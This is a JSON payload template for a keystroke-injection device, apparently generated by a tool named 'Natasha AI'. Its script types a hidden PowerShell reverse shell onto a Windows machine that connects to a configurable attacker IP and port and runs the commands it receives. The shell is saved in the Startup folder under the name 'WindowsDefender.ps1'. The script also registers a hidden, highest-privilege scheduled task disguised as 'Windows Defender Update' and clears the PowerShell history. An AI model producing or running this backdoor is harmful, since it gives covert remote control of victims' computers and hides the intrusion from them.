{
  "metadata": {
    "name": "Windows Backdoor",
    "description": "Creates persistent backdoor access on Windows systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "PowerShell Reverse Shell",
      "description": "Creates a PowerShell reverse shell that connects back to a specified IP",
      "attack_type": "backdoor",
      "script": [
        "REM Windows PowerShell Reverse Shell Backdoor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass",
        "ENTER",
        "DELAY 1000",
        "STRING $backdoorDir = &quot;$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;",
        "ENTER",
        "STRING $backdoorPath = &quot;$backdoorDir\\WindowsDefender.ps1&quot;",
        "ENTER",
        "STRING $attackerIP = &quot;{ATTACKER_IP}&quot;",
        "ENTER",
        "STRING $attackerPort = &quot;{ATTACKER_PORT}&quot;",
        "ENTER",
        "STRING $backdoorContent = @&quot;",
        "ENTER",
        "STRING # Windows Security Service",
        "ENTER",
        "STRING while($true) {",
        "ENTER",
        "STRING     try {",
        "ENTER",
        "STRING         $client = New-Object System.Net.Sockets.TCPClient('$attackerIP', $attackerPort)",
        "ENTER",
        "STRING         $stream = $client.GetStream()",
        "ENTER",
        "STRING         [byte[]]$bytes = 0..65535|%{0}",
        "ENTER",
        "STRING         while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {",
        "ENTER",
        "STRING             $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)",
        "ENTER",
        "STRING             $sendback = (Invoke-Expression $data 2>&1 | Out-String)",
        "ENTER",
        "STRING             $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '",
        "ENTER",
        "STRING             $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)",
        "ENTER",
        "STRING             $stream.Write($sendbyte,0,$sendbyte.Length)",
        "ENTER",
        "STRING             $stream.Flush()",
        "ENTER",
        "STRING         }",
        "ENTER",
        "STRING         $client.Close()",
        "ENTER",
        "STRING     } catch {",
        "ENTER",
        "STRING         Start-Sleep -Seconds 10",
        "ENTER",
        "STRING     }",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING &quot;@",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Create startup directory if it doesn't exist",
        "ENTER",
        "STRING if (!(Test-Path $backdoorDir)) {",
        "ENTER",
        "STRING     New-Item -ItemType Directory -Force -Path $backdoorDir | Out-Null",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Write backdoor script",
        "ENTER",
        "STRING Set-Content -Path $backdoorPath -Value $backdoorContent",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Create scheduled task for persistence",
        "ENTER",
        "STRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument &quot;-WindowStyle Hidden -ExecutionPolicy Bypass -File `&quot;$backdoorPath`&quot;`&quot;",
        "ENTER",
        "STRING $trigger = New-ScheduledTaskTrigger -AtLogon",
        "ENTER",
        "STRING $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable",
        "ENTER",
        "STRING $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty UserName) -RunLevel Highest",
        "ENTER",
        "STRING Register-ScheduledTask -TaskName &quot;Windows Defender Update&quot; -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Start the backdoor",
        "ENTER",
        "STRING Start-Process powershell.exe -ArgumentList &quot;-WindowStyle Hidden -ExecutionPolicy Bypass -File `&quot;$backdoorPath`&quot;&quot;",
        "ENTER",
        "STRING",
        "ENTER",
        "STRING # Clean up PowerShell history",
        "ENTER",
        "STRING Clear-History",
        "ENTER",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "ATTACKER_IP": "192.168.1.100",
        "ATTACKER_PORT": "4444"
      }
    }
  ]
}